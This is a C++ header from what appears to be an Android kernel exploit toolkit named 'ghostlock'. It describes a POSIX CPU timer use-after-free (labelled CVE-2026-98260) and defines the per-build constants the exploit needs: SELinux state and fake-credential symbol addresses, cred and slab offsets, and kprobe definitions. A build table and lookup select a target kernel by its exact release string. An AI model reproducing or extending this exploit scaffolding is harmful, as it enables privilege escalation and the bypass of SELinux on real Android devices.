#ifndef GHOSTLOCK_TIMER_KBUILDS_H
#define GHOSTLOCK_TIMER_KBUILDS_H

#include <cstddef>
#include <cstring>
#include <sys/utsname.h>

namespace ghostlock::timer {
    /* CVE-2026-98260 per-build constants.
     *
     * POSIX CPU timer UAF: `begin_new_exec()` cleans the timerqueue only after
     * the fallible `exec_task_namespaces()`, and `posix_cpu_timer_del()` leaves
     * `it.cpu.node` linked when `pid_task()` returns NULL. A thread that dies
     * mid-exec therefore frees its `k_itimer` (posix_timers_cache) while the
     * timerqueue node stays in the queue; reaping the zombie later walks that
     * stale node and `rb_erase` performs one 8-byte store at an address the
     * reclaimed page controls.
     *
     * Every value below is per kernel build: the two instruction sites change
     * with compiler output, the data symbols change with every link, and the
     * geometry changes when sizeof(struct k_itimer) changes. One build gets one
     * header, registered in the table at the bottom. Selection is an exact
     * `uname -r` match - the same contract kernel_profiles use.
     *
     * Runtime requirements (SELinux shell domain / Shizuku, not untrusted_app):
     * write tracefs kprobe_events + tracing_on, read trace, read slabinfo.
     *
     * Sources for the values in kbuilds/<release>.h are recorded in each header. */
    struct kbuild final {
        const char *release;
        /* Link-time (pre-KASLR) addresses, from the image's kallsyms. */
        unsigned long long selinux_state;
        unsigned long long arm64_sys_getpid;
        /* Link-time addresses of the fake-cred anchors. Zero means "this image
         * did not yield the symbol", which disables the fake-cred chain. */
        unsigned long long panic_on_warn;
        unsigned long long root_user;
        unsigned long long init_user_ns;
        unsigned long long init_ucounts;
        unsigned long long init_groups;
        /* BTF-derived structure geometry. */
        unsigned long long off_task_cred;
        unsigned long long k_itimer_node_off;
        unsigned long long k_itimer_rcu_off;
        /* Byte offset of the embedded hrtimer inside k_itimer; 0 means the timer
         * probe already yields the k_itimer itself. */
        unsigned long long k_itimer_hrtimer_off;
        unsigned long long timer_alloc;
        unsigned long long slab_bytes;
        unsigned long long slab_objects;
        /* Instruction-level offset inside do_timer_create where x19 holds the
         * freshly allocated k_itimer. This is the least portable value: it
         * changes with the compiler and the build. */
        unsigned long long do_timer_create_x19_off;
        unsigned int cred_uid_off;
        /* cred.securebits: zero => this image did not yield it; the chain then
         * skips the securebits write and says so. */
        unsigned int cred_securebits_off;
        /* kprobe definitions used as the observation channel. Kept per build
         * because the register/argument positions are instruction facts. */
        const char *probe_getpid;
        const char *probe_cred;
        const char *probe_timer;
        const char *probe_free_slab;
    };
} // namespace ghostlock::timer

/* --- build includes (timer-extract registers here) ---
 * Included outside the namespace: every kbuilds header opens
 * ghostlock::timer itself, so it can also be compiled standalone. */
#include "kernel/kbuilds/6.6.118-android15-8-gb9cc6ec16bc8-abogki536571621-4k.h"
#include "kernel/kbuilds/6.6.118-android15-8-gf72a02f47f4b-abogki551678766-4k.h"
/* --- end build includes --- */

namespace ghostlock::timer {
    inline const kbuild *const kbuild_table[] = {
            /* --- build entries (timer-extract registers here) --- */
            &kbuild_6_6_118_android15_8_gb9cc6ec16bc8_abogki536571621_4k,
        &kbuild_6_6_118_ANDROID15_8_GF72A02F47F4B_ABOGKI551678766_4K,
            /* --- end build entries --- */
    };

    inline constexpr std::size_t kbuild_count =
            sizeof(kbuild_table) / sizeof(kbuild_table[0]);

    /* Whole-string match, exactly like the kernel_profiles registry: a build
     * that is not in the table is unsupported, never approximated. */
    [[nodiscard]] inline const kbuild *kbuild_lookup(const char *release) noexcept {
        if (release == nullptr) return nullptr;
        for (std::size_t i = 0; i < kbuild_count; i++) {
            if (std::strcmp(release, kbuild_table[i]->release) == 0) {
                return kbuild_table[i];
            }
        }
        return nullptr;
    }

    [[nodiscard]] inline const kbuild *kbuild_current() noexcept {
        struct utsname u {};
        if (uname(&u) != 0) return nullptr;
        return kbuild_lookup(u.release);
    }

    /* True when the running build has a CVE-2026-98260 constant table. Used by
     * main() to route the run to this backend instead of the futex chain. */
    [[nodiscard]] inline bool host_supported() noexcept {
        return kbuild_current() != nullptr;
    }
} // namespace ghostlock::timer

#endif
